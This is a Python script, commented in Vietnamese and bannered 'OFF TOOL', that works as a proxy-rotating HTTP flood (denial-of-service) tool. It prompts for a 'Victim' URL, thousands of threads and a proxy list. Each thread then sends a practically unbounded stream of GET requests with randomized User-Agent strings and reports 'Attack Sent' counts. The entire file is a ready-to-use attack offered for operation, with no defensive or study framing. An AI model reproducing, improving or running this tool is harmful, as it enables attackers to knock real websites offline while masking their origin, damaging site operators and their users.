import threading
import requests
import time
import os
import random
from collections import defaultdict

# Danh sách User-Agent
user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/44.0.2403.67 Mobile/12D508 Safari/600.1.4",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0"
]

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def check_status(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print("\033[1;32mStatus: 200 Ok \033[1;31m| \033[1;37mServer Online")
        else:
            print("\033[1;31mStatus: {} Error \033[1;31mServer Is Down !!!".format(response.status_code))
    except requests.RequestException:
        print("\033[1;31mRequests Send Error")

def load_website(url, num_requests, proxies, request_count_per_proxy):
    proxy_usage = defaultdict(int)
    count = 0

    while count < num_requests:
        try:
            proxy = random.choice(proxies)
            proxy_usage[proxy] += 1
            headers = {'User-Agent': random.choice(user_agents)}
            requests.get(url, proxies={'http': proxy, 'https': proxy}, headers=headers)
            count += 1
            if count % 100 == 0:  # In ra thông tin mỗi 100000 yêu cầu
                print(f"\033[1;37mAttack Sent To\033[1;31m: \033[1;32m{count}")
        except requests.RequestException:
            pass  # Xóa thông báo lỗi trong khối except

    # Cập nhật số lượng yêu cầu gửi đi cho mỗi proxy
    request_count_per_proxy.update(proxy_usage)

def main():
    # Xóa màn hình và in thông điệp
    clear_screen()
    print("""
                    \033[1;37m╔═════════════════════════════════════════════╗
  \033[1;31m  ██████╗ ███████╗███████╗    ████████╗ ██████╗  ██████╗ ██╗     
  \033[1;36m ██╔═══██╗██╔════╝██╔════╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
  \033[1;32m ██║   ██║█████╗  █████╗         ██║   ██║   ██║██║   ██║██║     
  \033[1;34m ██║   ██║██╔══╝  ██╔══╝         ██║   ██║   ██║██║   ██║██║     
  \033[1;35m ╚██████╔╝██║     ██║            ██║   ╚██████╔╝╚██████╔╝███████╗
  \033[1;31m  ╚═════╝ ╚═╝     ╚═╝            ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
                    \033[1;37m╚═════════════════════════════════════════════╝

""")

    # Nhập URL, số lượng luồng và thời gian từ người dùng
    url = input("\033[1;31mVictim: \033[1;37m")
    num_threads = int(input("\033[1;31mThread \033[1;31m(\033[1;37m4500/15000\033[1;31m): \033[1;37m"))
    duration = int(input("\033[1;31mDuration: \033[1;37m"))
    proxy_file = input("\033[1;31mProxyFile \033[1;37m")

    # Đọc proxy từ file
    if not os.path.isfile(proxy_file):
        print(f"\033[1;31mFile {proxy_file} does not exist.")
        return

    with open(proxy_file, 'r') as file:
        proxies = [line.strip() for line in file if line.strip()]

    if not proxies:
        print("\033[1;31mNo valid proxies found in the file.")
        return

    # Kiểm tra trạng thái trang web
    check_status(url)

    # Số lượng yêu cầu mỗi luồng gửi
    requests_per_thread = 99999999999999999999999999999999999999999999  # Bạn có thể thay đổi giá trị này theo nhu cầu

    # Tạo và chạy các luồng
    request_count_per_proxy = defaultdict(int)

    # Khởi tạo và chạy các luồng
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=load_website, args=(url, requests_per_thread, proxies, request_count_per_proxy))
        thread.start()
        threads.append(thread)

    # Chờ các luồng hoàn tất
    for thread in threads:
        thread.join()

    # In kết quả
    print("\n\033[1;37mAttack Results:")
    for proxy, count in request_count_per_proxy.items():
        print(f"\033[1;37mAttack Sent For: \033[1;32m{proxy} \033[1;37m| Request-Per-Proxy: \033[1;32m{count}")

if __name__ == "__main__":
    main()